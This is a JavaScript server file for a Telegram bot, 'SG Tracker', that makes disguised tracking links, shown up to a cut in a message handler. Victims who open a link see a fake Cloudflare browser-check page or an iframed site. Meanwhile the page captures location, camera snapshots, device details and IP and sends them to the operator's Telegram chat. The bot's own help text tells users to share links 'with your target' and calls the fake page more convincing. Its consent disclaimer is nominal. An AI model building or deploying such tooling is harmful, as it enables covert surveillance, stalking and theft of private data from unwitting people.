require('dotenv').config();
const fs = require('fs');
const path = require('path');
const express = require('express');
const serverless = require('serverless-http');
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const ejs = require('ejs');

// Initialize Express app
const app = express();

// Middleware
app.use(bodyParser.json({limit:1024*1024*20, type:'application/json'}));
app.use(bodyParser.urlencoded({ extended:true, limit:1024*1024*20, type:'application/x-www-form-urlencoded' }));
app.use(cors());

// Global variables
const bot = new TelegramBot(process.env.bot);
const hostURL = "https://sg-modder-offcial.vercel.app"; // अपना Vercel URL यहां है
const use1pt = false;

// Get the template paths
const viewsPath = path.join(process.cwd(), 'views');
const webviewTemplate = fs.readFileSync(path.join(viewsPath, 'webview.ejs'), 'utf8');
const cloudflareTemplate = fs.readFileSync(path.join(viewsPath, 'cloudflare.ejs'), 'utf8');

// Helper functions
function getClientIp(req) {
  let ip;
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  return ip;
}

function getFormattedDate() {
  var d = new Date();
  return d.toJSON().slice(0, 19).replace('T', ':');
}

function atob(str) {
  return Buffer.from(str, 'base64').toString();
}

// URL Shortening Services
// 1. XCut URL Shortener
async function shortenUrlWithXcut(url) {
  try {
    const response = await fetch('https://xcut.vercel.app/api/shorten', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ url }),
    });
    
    const data = await response.json();
    
    if (!response.ok) {
      throw new Error(data.error || 'Failed to shorten URL with XCut');
    }
    
    return data.shortUrl;
  } catch (error) {
    console.error('Error shortening URL with XCut:', error);
    throw error;
  }
}

// 2. TinyURL Shortener
async function shortenUrlWithTinyurl(url) {
  try {
    const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
    if (!response.ok) {
      throw new Error('Failed to shorten URL with TinyURL');
    }
    return await response.text();
  } catch (error) {
    console.error('Error shortening URL with TinyURL:', error);
    throw error;
  }
}

// 3. Is.gd URL Shortener
async function shortenUrlWithIsgd(url) {
  try {
    const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`);
    if (!response.ok) {
      throw new Error('Failed to shorten URL with Is.gd');
    }
    const shortUrl = await response.text();
    return shortUrl;
  } catch (error) {
    console.error('Error shortening URL with Is.gd:', error);
    throw error;
  }
}

// 4. Cleanuri URL Shortener
async function shortenUrlWithCleanuri(url) {
  try {
    const response = await fetch('https://cleanuri.com/api/v1/shorten', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `url=${encodeURIComponent(url)}`,
    });
    
    if (!response.ok) {
      throw new Error('Failed to shorten URL with Cleanuri');
    }
    
    const data = await response.json();
    return data.result_url;
  } catch (error) {
    console.error('Error shortening URL with Cleanuri:', error);
    throw error;
  }
}

// Attempt to shorten a URL with multiple services
async function shortenUrl(url) {
  const results = [];
  const shorteners = [
    { name: "XCut", fn: shortenUrlWithXcut },
    { name: "TinyURL", fn: shortenUrlWithTinyurl },
    { name: "Is.gd", fn: shortenUrlWithIsgd },
    { name: "Cleanuri", fn: shortenUrlWithCleanuri }
  ];
  
  for (const shortener of shorteners) {
    try {
      const shortUrl = await shortener.fn(url);
      if (shortUrl) {
        results.push({ name: shortener.name, url: shortUrl });
      }
    } catch (error) {
      // Silently fail - we'll only show successful shorteners
      console.log(`${shortener.name} shortener failed for ${url}: ${error.message}`);
    }
  }
  
  return results;
}

// Generate a random string for URL uniqueness
function generateRandomString(length = 8) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Create a link function with animated progress bar and message editing
async function createLink(cid, msg, captureMethodId = "full") {
  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
    // Generate a unique ID for this tracking link
    const uniqueId = generateRandomString(10);
    var url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64') + '/' + uniqueId;
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [
          [{ text: "🔄 Create New Link", callback_data: "crenew" }]
        ]
      })
    };

    // Get capture method code
    const captureCode = captureMethods.generateCaptureCode(captureMethodId);
    
    // Add capture method code to URLs
    var cUrl = `${hostURL}/c/${url}/${captureCode}`;
    var wUrl = `${hostURL}/w/${url}/${captureCode}`;

    // Progress bar stages
    const progressStages = [
      "⬜⬜⬜⬜⬜ 0%",
      "🟦⬜⬜⬜⬜ 20%",
      "🟦🟦⬜⬜⬜ 40%",
      "🟦🟦🟦⬜⬜ 60%",
      "🟦🟦🟦🟦⬜ 80%",
      "🟦🟦🟦🟦🟦 100%"
    ];
    
    // Send initial processing message with stage 0 progress bar
    const processingMsg = await bot.sendMessage(
      cid, 
      `<b>🔮 Generating your tracking links...</b>\n\n` +
      `<i>Preparing services...</i>\n` +
      `${progressStages[0]}`, 
      { parse_mode: "HTML" }
    );
    
    const processingMsgId = processingMsg.message_id;
    
    try {
      // Update to 20% - Starting URL shortening
      await bot.editMessageText(
        `<b>🔮 Generating your tracking links...</b>\n\n` +
        `<i>Connecting to URL shorteners...</i>\n` +
        `${progressStages[1]}`,
        { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML" 
        }
      );

      // First shorten the CloudFlare link with multiple services
      const shortenedCUrls = await shortenUrl(cUrl);
      
      // Update to 40% - Half of shortening done
      await bot.editMessageText(
        `<b>🔮 Generating your tracking links...</b>\n\n` +
        `<i>Creating CloudFlare links...</i>\n` +
        `${progressStages[2]}`,
        { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML" 
        }
      );
      
      // Then shorten the WebView link with multiple services
      const shortenedWUrls = await shortenUrl(wUrl);
      
      // Update to 60% - Shortening complete
      await bot.editMessageText(
        `<b>🔮 Generating your tracking links...</b>\n\n` +
        `<i>Creating WebView links...</i>\n` +
        `${progressStages[3]}`,
        { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML" 
        }
      );
      
      // Update to 80% - Preparing final message
      await bot.editMessageText(
        `<b>🔮 Generating your tracking links...</b>\n\n` +
        `<i>Finalizing your links...</i>\n` +
        `${progressStages[4]}`,
        { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML" 
        }
      );
      
      // Update to 100% - All done
      await bot.editMessageText(
        `<b>🔮 Generating your tracking links...</b>\n\n` +
        `<i>Everything is ready!</i>\n` +
        `${progressStages[5]}`,
        { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML" 
        }
      );
      
      // Small delay for better UX
      await new Promise(resolve => setTimeout(resolve, 500));
      
      if (shortenedCUrls.length > 0 || shortenedWUrls.length > 0) {
        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
        
        // Add CloudFlare links with better formatting and visuals
        message += `<b>🛡️ CLOUDFLARE PAGE LINKS</b>\n`;
        message += `<i>Shows a Cloudflare security check page before redirecting</i>\n\n`;
        message += `🔗 <b>Original:</b> <a href="${cUrl}">Click to open</a>\n\n`;
        
        // Only add shorteners that worked - with symbols but without service names
        if (shortenedCUrls.length > 0) {
          message += `<b>📎 Shortened URLs:</b>\n`;
          shortenedCUrls.forEach((shortened, index) => {
            let symbol = '';
            if (shortened.name === 'XCut') symbol = '⚡';
            else if (shortened.name === 'TinyURL') symbol = '🔗';
            else if (shortened.name === 'Is.gd') symbol = '🌟';
            else if (shortened.name === 'Cleanuri') symbol = '💫';
            else symbol = '🔗';
            
            // Just show the shortened URL without the service name
            message += `${symbol} <a href="${shortened.url}">${shortened.url}</a>\n`;
          });
        }
        
        message += `\n<b>🌐 WEBVIEW PAGE LINKS</b>\n`;
        message += `<i>Shows the target website in an iframe</i>\n\n`;
        message += `🔗 <b>Original:</b> <a href="${wUrl}">Click to open</a>\n\n`;
        
        // Only add shorteners that worked - with symbols but without service names
        if (shortenedWUrls.length > 0) {
          message += `<b>📎 Shortened URLs:</b>\n`;
          shortenedWUrls.forEach((shortened, index) => {
            let symbol = '';
            if (shortened.name === 'XCut') symbol = '⚡';
            else if (shortened.name === 'TinyURL') symbol = '🔗';
            else if (shortened.name === 'Is.gd') symbol = '🌟';
            else if (shortened.name === 'Cleanuri') symbol = '💫';
            else symbol = '🔗';
            
            // Just show the shortened URL without the service name
            message += `${symbol} <a href="${shortened.url}">${shortened.url}</a>\n`;
          });
        }
        
        message += `\n<b>⚠️ Remember:</b> <i>These links will collect target's data when opened.</i>`;
        
        // Replace the progress message with the final links
        await bot.editMessageText(message, { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML",
          reply_markup: m.reply_markup
        });
      } else {
        // If all URL shorteners fail, send direct links with better formatting
        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
        
        message += `<b>🛡️ CLOUDFLARE PAGE LINK:</b>\n`;
        message += `<i>Shows a Cloudflare security check page</i>\n`;
        message += `<a href="${cUrl}">${cUrl}</a>\n\n`;
        
        message += `<b>🌐 WEBVIEW PAGE LINK:</b>\n`;
        message += `<i>Shows the target website in an iframe</i>\n`;
        message += `<a href="${wUrl}">${wUrl}</a>\n\n`;
        
        message += `<b>⚠️ Remember:</b> <i>These links will collect target's data when opened.</i>`;
        
        // Replace the progress message with the final links
        await bot.editMessageText(message, { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML",
          reply_markup: m.reply_markup
        });
      }
    } catch (error) {
      console.error("Error generating links:", error);
      
      try {
        // Replace the progress message with an error message
        await bot.editMessageText(
          `<b>⚠️ Error generating tracking links</b>\n\n` +
          `Something went wrong while generating your links. Please try again.\n\n` +
          `Error details: ${error.message}`,
          { 
            chat_id: cid, 
            message_id: processingMsgId,
            parse_mode: "HTML"
          }
        );
      } catch (e) {
        console.log("Couldn't edit processing message: ", e);
        
        // If error occurs, send direct links with better formatting
        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
        
        message += `<b>🛡️ CLOUDFLARE PAGE LINK:</b>\n`;
        message += `<i>Shows a Cloudflare security check page</i>\n`;
        message += `<a href="${cUrl}">${cUrl}</a>\n\n`;
        
        message += `<b>🌐 WEBVIEW PAGE LINK:</b>\n`;
        message += `<i>Shows the target website in an iframe</i>\n`;
        message += `<a href="${wUrl}">${wUrl}</a>\n\n`;
        
        message += `<b>⚠️ Remember:</b> <i>These links will collect target's data when opened.</i>`;
        
        await bot.sendMessage(cid, message, { 
          reply_markup: m.reply_markup,
          parse_mode: "HTML"
        });
      }
    }
    
    return true;
  } else {
    await bot.sendMessage(cid, `<b>⚠️ ERROR!</b>\n\nPlease enter a valid URL including http or https.`, { parse_mode: "HTML" });
    await createNew(cid);
    return false;
  }
}

// Define capture methods
const captureMethods = {
  // Different capture method configurations
  methods: [
    {
      id: "full",
      name: "Full Capture",
      description: "Device Info + Front Camera + Location",
      emoji: "📱",
      code: "full"
    },
    {
      id: "back",
      name: "Back Camera",
      description: "Device Info + Back Camera + Location",
      emoji: "📷", 
      code: "back"
    },
    {
      id: "minimal",
      name: "Minimal",
      description: "Device Info + Location only (No Camera)",
      emoji: "💻",
      code: "min"
    },
    {
      id: "audio",
      name: "Audio Capture",
      description: "Device Info + Audio Recording + Location",
      emoji: "🎤",
      code: "audio"
    },
    {
      id: "screen",
      name: "Screen Capture",
      description: "Device Info + Screen Recording + Location",
      emoji: "🎬",
      code: "screen"
    }
  ],
  
  // Get capture method by ID
  getMethod: function(id) {
    return this.methods.find(method => method.id === id) || this.methods[0];
  },
  
  // Generate code for capture method (to be passed in URL)
  generateCaptureCode: function(id) {
    const method = this.getMethod(id);
    return method.code;
  },
  
  // Create keyboard with capture method options
  getKeyboard: function() {
    const keyboard = [];
    
    // Create rows with two buttons each
    for (let i = 0; i < this.methods.length; i += 2) {
      const row = [];
      
      // Add first button
      row.push({
        text: `${this.methods[i].emoji} ${this.methods[i].name}`,
        callback_data: `capture_${this.methods[i].id}`
      });
      
      // Add second button if available
      if (i + 1 < this.methods.length) {
        row.push({
          text: `${this.methods[i+1].emoji} ${this.methods[i+1].name}`,
          callback_data: `capture_${this.methods[i+1].id}`
        });
      }
      
      keyboard.push(row);
    }
    
    // Add cancel button at the bottom
    keyboard.push([
      {
        text: "❌ Cancel",
        callback_data: "capture_cancel"
      }
    ]);
    
    return keyboard;
  }
};

// Create new request function with capture methods
async function createNew(cid, messageId = null) {
  // Show capture method selection keyboard
  const captureKeyboard = {
    reply_markup: JSON.stringify({
      "inline_keyboard": captureMethods.getKeyboard()
    })
  };
  
  // Message content
  const methodSelectionText = `<b>🌟 Choose Capture Method 🌟</b>\n\n` +
    `Select what you want to capture from your target:`;
  
  // If messageId is provided, edit the existing message
  if (messageId) {
    try {
      await bot.editMessageText(methodSelectionText, { 
        chat_id: cid,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: captureKeyboard.reply_markup
      });
    } catch (error) {
      console.error("Error editing method selection message:", error);
      
      // Fallback to sending a new message
      await bot.sendMessage(
        cid, 
        methodSelectionText,
        { 
          parse_mode: "HTML",
          reply_markup: captureKeyboard.reply_markup
        }
      );
    }
  } else {
    // Send a new message
    await bot.sendMessage(
      cid, 
      methodSelectionText,
      { 
        parse_mode: "HTML",
        reply_markup: captureKeyboard.reply_markup
      }
    );
  }
}

// Process the link creation with the selected capture method
async function processLinkWithCaptureMethod(cid, captureMethodId, messageId = null) {
  // Get the selected method
  const method = captureMethods.getMethod(captureMethodId);
  
  // Create force reply keyboard for URL input
  const forceReplyKeyboard = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  
  // Single message with method info and URL prompt
  const messageText = `${method.emoji} ${method.name} selected\n\n` +
    `<b>This will capture:</b> <i>${method.description}</i>\n\n` +
    `Enter Your URL:`;
  
  try {
    if (messageId) {
      // If we have a message ID, first try to delete it 
      // (since we can't add force_reply to an edited message)
      try {
        await bot.deleteMessage(cid, messageId);
      } catch (deleteError) {
        console.log("Could not delete message, but will continue:", deleteError.message);
      }
    }
    
    // Send a single message with force reply
    await bot.sendMessage(
      cid, 
      messageText, 
      {
        parse_mode: "HTML",
        reply_markup: forceReplyKeyboard.reply_markup
      }
    );
  } catch (error) {
    console.error("Error in processing capture method:", error);
    
    // Last resort fallback
    await bot.sendMessage(
      cid, 
      messageText,
      {
        parse_mode: "HTML",
        reply_markup: forceReplyKeyboard.reply_markup
      }
    );
  }
  
  // The actual link creation will happen when the user replies to this message
  // That part is handled in the message handler with createLink
}

// ROUTES

// Root route - returns the client IP
app.get("/", (req, res) => {
  const ip = getClientIp(req);
  res.json({"ip": ip});
});

// POST route for device information
app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  
  var ip = getClientIp(req);
    
  if (uid != null && data != null) {
    if (data.indexOf(ip) < 0) {
      return res.send("ok");
    }
    
    data = data.replaceAll("<br>", "\n");
    
    bot.sendMessage(parseInt(uid, 36), data, {parse_mode: "HTML"});
    
    res.send("Done");
  } else {
    res.status(400).send("Bad Request");
  }
});

// Location route
app.post("/location", async (req, res) => {
  try {
    var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    var uid = decodeURIComponent(req.body.uid) || null;
    var acc = decodeURIComponent(req.body.acc) || null;
    
    if (lon != null && lat != null && uid != null && acc != null) {
      await bot.sendLocation(parseInt(uid, 36), lat, lon);
      await bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
      
      res.send("Done");
    } else {
      res.status(400).send("Bad Request");
    }
  } catch (error) {
    console.error("Error in location handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Camera snapshot route
app.post("/camsnap", async (req, res) => {
  try {
    var uid = decodeURIComponent(req.body.uid) || null;
    var img = decodeURIComponent(req.body.img) || null;
      
    if (uid != null && img != null) {
      var buffer = Buffer.from(img, 'base64');
        
      var info = {
        filename: "camsnap.png",
        contentType: 'image/png'
      };
        
      try {
        await bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
      } catch (error) {
        console.log("Error sending photo:", error);
      }
        
      res.send("Done");
    } else {
      res.status(400).send("Bad Request");
    }
  } catch (error) {
    console.error("Error in camsnap handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Webview route with capture method
app.get("/w/:uid/:uri/:uniqueId?/:captureMethod?", async (req, res) => {
  try {
    const uid = req.params.uid;
    const uri = req.params.uri;
    const uniqueId = req.params.uniqueId || 'default';
    const captureMethod = req.params.captureMethod || "full"; // Default to full capture
    
    if (!uid || !uri) {
      return res.redirect("https://t.me/SG_Modder");
    }
    
    const ip = getClientIp(req);
    const time = getFormattedDate();
    
    // Log access with unique ID for tracking
    console.log(`WebView access: ${uniqueId} | IP: ${ip} | Time: ${time}`);
    
    // Render the template
    const html = ejs.render(webviewTemplate, {
      ip: ip,
      time: time,
      url: atob(uri),
      uid: uid,
      a: hostURL,
      t: use1pt,
      captureMethod: captureMethod
    });
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error("Error in webview handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Cloudflare route with capture method
app.get("/c/:uid/:uri/:uniqueId?/:captureMethod?", async (req, res) => {
  try {
    const uid = req.params.uid;
    const uri = req.params.uri;
    const uniqueId = req.params.uniqueId || 'default';
    const captureMethod = req.params.captureMethod || "full"; // Default to full capture
    
    if (!uid || !uri) {
      return res.redirect("https://t.me/SG_Modder");
    }
    
    const ip = getClientIp(req);
    const time = getFormattedDate();
    
    // Log access with unique ID for tracking
    console.log(`CloudFlare access: ${uniqueId} | IP: ${ip} | Time: ${time}`);
    
    // Render the template
    const html = ejs.render(cloudflareTemplate, {
      ip: ip,
      time: time,
      url: atob(uri),
      uid: uid,
      a: hostURL,
      t: use1pt,
      captureMethod: captureMethod
    });
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error("Error in cloudflare handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Telegram Bot Webhook Handler for production
app.post("/webhook", async (req, res) => {
  try {
    const update = req.body;
    
    // Handle callback queries (button clicks)
    if (update.callback_query) {
      const callbackQuery = update.callback_query;
      await bot.answerCallbackQuery(callbackQuery.id);
      const chatId = callbackQuery.message.chat.id;
      
      if (callbackQuery.data === "crenew") {
        // For create new, edit the current message
        await createNew(chatId, callbackQuery.message.message_id);
      } else if (callbackQuery.data === "help") {
        // Show help message when the help button is clicked - edit message
        await sendHelpMessage(chatId, callbackQuery.message.message_id);
      } else if (callbackQuery.data === "back_to_main") {
        // Go back to main menu - edit message
        await sendWelcomeMessage(chatId, callbackQuery.message.chat.first_name, callbackQuery.message.message_id);
      } else if (callbackQuery.data === "channels") {
        // Show channels information by editing current message
        await bot.editMessageText(
          `<b>📢 SG Modder Channels 📢</b>\n\n` +
          `Join our official channels for updates, tools and more!\n\n` +
          `• <a href="https://t.me/sgmoddernew">@sgmoddernew</a> - Main channel\n` +
          `• <a href="https://t.me/SG_Modder0">@SG_Modder0</a> - Updates channel\n` +
          `• <a href="https://t.me/SG_Modder1">@SG_Modder1</a> - Tools channel\n\n` +
          `<b>👨‍💻 Contact:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>`,
          { 
            chat_id: chatId, 
            message_id: callbackQuery.message.message_id, 
            parse_mode: "HTML",
            reply_markup: JSON.stringify({
              "inline_keyboard": [
                [
                  { text: "🔙 Back", callback_data: "back_to_main" }
                ]
              ]
            })
          }
        );
      } else if (callbackQuery.data.startsWith("capture_")) {
        // Handle capture method selection
        const captureMethodId = callbackQuery.data.replace("capture_", "");
        
        if (captureMethodId === "cancel") {
          // User canceled the capture method selection - edit current message
          await bot.editMessageText(
            `<b>❌ Operation canceled</b>\n\nUse /create to start again when you're ready.`,
            { 
              chat_id: chatId, 
              message_id: callbackQuery.message.message_id,
              parse_mode: "HTML",
              reply_markup: JSON.stringify({
                "inline_keyboard": [
                  [
                    { text: "🔗 Try Again", callback_data: "crenew" }
                  ],
                  [
                    { text: "🔙 Back to Main Menu", callback_data: "back_to_main" }
                  ]
                ]
              })
            }
          );
        } else {
          // Process the selected capture method - edit current message
          await processLinkWithCaptureMethod(chatId, captureMethodId, callbackQuery.message.message_id);
        }
      }
      
      return res.status(200).send("OK");
    }
    
    // Handle messages
    if (update.message) {
      const msg = update.message;
      const chatId = msg.chat.id;
      
      // Handle reply to capture method prompt or URL input
      if (msg.reply_to_message && msg.reply_to_message.text) {
        const replyText = msg.reply_to_message.text;
        
        // Check if this is a URL input after selecting a capture method
        if (replyText.includes("This will capture:") || 
            replyText.includes("Enter Your URL:") || 
            replyText.includes("Enter URL to track")) {
          console.log("Webhook: Detected reply to URL prompt:", replyText);
          
          // Find which capture method was selected based on text content
          let methodId = "full"; // Default
          
          if (replyText.includes("Front Camera")) {
            methodId = "full";
          } else if (replyText.includes("Back Camera")) {
            methodId = "back";
          } else if (replyText.includes("Minimal") || replyText.includes("No Camera")) {
            methodId = "minimal";
          } else if (replyText.includes("Audio")) {
            methodId = "audio";
          } else if (replyText.includes("Screen")) {
            methodId = "screen";
          }
          
          console.log("Webhook: Creating link with method:", methodId);
          // Create a link with the selected capture method
          await createLink(chatId, msg.text, methodId);
          return res.status(200).send("OK");
        }
        // Basic URL input handling (backward compatibility)
        else if (replyText === "🌐 Enter Your URL") {
          await createLink(chatId, msg.text);
          return res.status(200).send("OK");
        }
      }
      
      // Handle /start command
      if (msg.text === "/start") {
        await sendWelcomeMessage(chatId, msg.chat.first_name);
      }
      // Handle /create command
      else if (msg.text === "/create") {
        await createNew(chatId);
      }
      // Handle /help command
      else if (msg.text === "/help") {
        await sendHelpMessage(chatId);
      }
    }
    
    res.status(200).send("OK");
  } catch (error) {
    console.error("Error in webhook handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Helper function to send welcome message
async function sendWelcomeMessage(chatId, firstName, messageId = null) {
  // Show typing indicator for a more interactive feel
  await bot.sendChatAction(chatId, "typing");
  
  // Create an enhanced keyboard with emojis
  var m = {
    reply_markup: JSON.stringify({
      "inline_keyboard": [
        [
          { text: "🔗 Create Tracking Link", callback_data: "crenew" }
        ],
        [
          { text: "ℹ️ Help", callback_data: "help" }
        ],
        [
          { text: "📢 Our Channels", callback_data: "channels" }
        ]
      ]
    })
  };
  
  // Welcome message content
  const welcomeText = `<b>🌟 Welcome ${firstName}! 🌟</b>\n\n` +
    `<i>SG Tracker</i> is your advanced tracking tool that creates custom links to gather information about anyone who clicks them.\n\n` +
    `<b>📱 What You Can Track:</b>\n` +
    `• 📍 Precise Location\n` +
    `• 📷 Camera Snapshots\n` +
    `• 🎥 Screen Recording\n` +
    `• 🎤 Audio Recording\n` +
    `• 💻 Device Information\n` +
    `• 🔋 Battery Status\n` +
    `• 🌐 Network Details\n\n` +
    `<b>👨‍💻 Developed by:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>\n` +
    `<b>🔗 GitHub:</b> <a href="https://github.com/SGModder-Offcial">SGModder-Offcial</a>\n\n` +
    `<b>🚀 Get Started:</b> Click the button below or type /create to generate your first tracking link!`;
  
  // If messageId is provided, edit the existing message
  if (messageId) {
    try {
      await bot.editMessageText(welcomeText, { 
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: m.reply_markup
      });
    } catch (error) {
      console.error("Error editing welcome message:", error);
      
      // Fallback to sending a new message
      await bot.sendMessage(
        chatId, 
        welcomeText, 
        { 
          parse_mode: "HTML",
          reply_markup: m.reply_markup
        }
      );
    }
  } else {
    // Send a new message
    await bot.sendMessage(
      chatId, 
      welcomeText, 
      { 
        parse_mode: "HTML",
        reply_markup: m.reply_markup
      }
    );
  }
}

// Helper function to send help message
async function sendHelpMessage(chatId, messageId = null) {
  // Show typing indicator
  await bot.sendChatAction(chatId, "typing");
  
  // Create keyboard with useful links/actions and back button
  const helpKeyboard = {
    reply_markup: JSON.stringify({
      "inline_keyboard": [
        [
          { text: "🔗 Create Tracking Link", callback_data: "crenew" }
        ],
        [
          { text: "📢 Our Channels", callback_data: "channels" }
        ],
        [
          { text: "🌐 GitHub Repo", url: "https://github.com/SGModder-Offcial" }
        ],
        [
          { text: "🔙 Back to Main Menu", callback_data: "back_to_main" }
        ]
      ]
    })
  };
  
  // Help message content
  const helpText = `<b>📚 SG TRACKER HELP GUIDE 📚</b>\n\n` +
    `<i>This powerful tool creates tracking links that collect information about anyone who clicks them.</i>\n\n` +
    
    `<b>🚀 Getting Started:</b>\n` +
    `1️⃣ Type /create or click the button below\n` +
    `2️⃣ Enter a URL when prompted (e.g., https://google.com)\n` +
    `3️⃣ The bot will generate your tracking links\n` +
    `4️⃣ Share these links with your target\n` +
    `5️⃣ When they open the link, you'll receive their information\n\n` +
    
    `<b>🔮 Available Link Types:</b>\n\n` +
    `<b>1. 🛡️ Cloudflare Page:</b>\n` +
    `• Shows a fake "Checking your browser" security page\n` +
    `• Collects data while displaying the security check\n` +
    `• Redirects to your target URL afterward\n` +
    `• More convincing for security-conscious users\n\n` +
    
    `<b>2. 🌐 Webview Page:</b>\n` +
    `• Shows your target URL in an iframe immediately\n` +
    `• Collects data in the background\n` +
    `• Note: Some sites block iframe embedding (e.g., Google)\n\n` +
    
    `<b>📱 Information Collected:</b>\n` +
    `• 📍 Location (requires permission)\n` +
    `• 📷 Camera snapshots (requires permission)\n` +
    `• 🎥 Screen Recording (coming soon)\n` +
    `• 🎤 Audio Recording (coming soon)\n` +
    `• 🖥️ Device & browser details\n` +
    `• 🔋 Battery information\n` +
    `• 🌐 IP address & network data\n\n` +
    
    `<b>👨‍💻 Developed by:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>\n` +
    `<b>⚠️ DISCLAIMER:</b> <i>Use responsibly and only with proper consent. This tool is for educational purposes only.</i>`;
  
  // If messageId is provided, edit the existing message
  if (messageId) {
    try {
      await bot.editMessageText(helpText, { 
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: helpKeyboard.reply_markup 
      });
    } catch (error) {
      console.error("Error editing help message:", error);
      
      // Fallback to sending a new message
      await bot.sendMessage(chatId, helpText, { 
        parse_mode: "HTML",
        reply_markup: helpKeyboard.reply_markup 
      });
    }
  } else {
    // Send a new message
    await bot.sendMessage(chatId, helpText, { 
      parse_mode: "HTML",
      reply_markup: helpKeyboard.reply_markup 
    });
  }
}

// For local development
if (process.env.NODE_ENV !== "production") {
  // Start polling for local testing
  console.log("Starting polling for local development...");
  
  bot.on('callback_query', async (callbackQuery) => {
    await bot.answerCallbackQuery(callbackQuery.id);
    const chatId = callbackQuery.message.chat.id;
    
    if (callbackQuery.data === "crenew") {
      await createNew(chatId, callbackQuery.message.message_id);
    } else if (callbackQuery.data === "help") {
      // Show help message when the help button is clicked
      await sendHelpMessage(chatId, callbackQuery.message.message_id);
    } else if (callbackQuery.data === "back_to_main") {
      // Go back to main menu
      await sendWelcomeMessage(chatId, callbackQuery.message.chat.first_name, callbackQuery.message.message_id);
    } else if (callbackQuery.data === "channels") {
      // Show channels information by editing current message
      await bot.editMessageText(
        `<b>📢 SG Modder Channels 📢</b>\n\n` +
        `Join our official channels for updates, tools and more!\n\n` +
        `• <a href="https://t.me/sgmoddernew">@sgmoddernew</a> - Main channel\n` +
        `• <a href="https://t.me/SG_Modder0">@SG_Modder0</a> - Updates channel\n` +
        `• <a href="https://t.me/SG_Modder1">@SG_Modder1</a> - Tools channel\n\n` +
        `<b>👨‍💻 Contact:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>`,
        { 
          chat_id: chatId, 
          message_id: callbackQuery.message.message_id, 
          parse_mode: "HTML",
          reply_markup: JSON.stringify({
            "inline_keyboard": [
              [
                { text: "🔙 Back", callback_data: "back_to_main" }
              ]
            ]
          })
        }
      );
    } else if (callbackQuery.data.startsWith("capture_")) {
      // Handle capture method selection
      const captureMethodId = callbackQuery.data.replace("capture_", "");
      
      if (captureMethodId === "cancel") {
        // User canceled the capture method selection - edit current message
        await bot.editMessageText(
          `<b>❌ Operation canceled</b>\n\nUse /create to start again when you're ready.`,
          { 
            chat_id: chatId, 
            message_id: callbackQuery.message.message_id,
            parse_mode: "HTML",
            reply_markup: JSON.stringify({
              "inline_keyboard": [
                [
                  { text: "🔗 Try Again", callback_data: "crenew" }
                ],
                [
                  { text: "🔙 Back to Main Menu", callback_data: "back_to_main" }
                ]
              ]
            })
          }
        );
      } else {
        // Process the selected capture method - edit current message instead of sending new one
        await processLinkWithCaptureMethod(chatId, captureMethodId, callbackQuery.message.message_id);
      }
    }
  });
  
  bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    
    // Handle reply to capture method prompt or URL input
